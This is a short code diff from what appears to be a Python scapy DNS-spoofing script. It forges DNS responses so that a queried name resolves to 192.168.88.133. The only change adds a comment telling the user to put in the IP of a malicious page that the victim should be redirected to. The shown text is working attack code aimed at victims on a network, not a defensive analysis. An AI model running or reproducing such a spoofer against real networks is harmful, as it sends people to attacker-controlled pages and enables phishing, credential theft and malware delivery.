@@ -16,7 +16,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
 
         print(f"[+] Spoofing DNS request for: {qname}")
-        answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.133")
+        answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.133") # put in rdata the ip of malicious page u need to redirect the victim
         scapy_packet[scapy.DNS].an = answer
         scapy_packet[scapy.DNS].ancount = 1
 
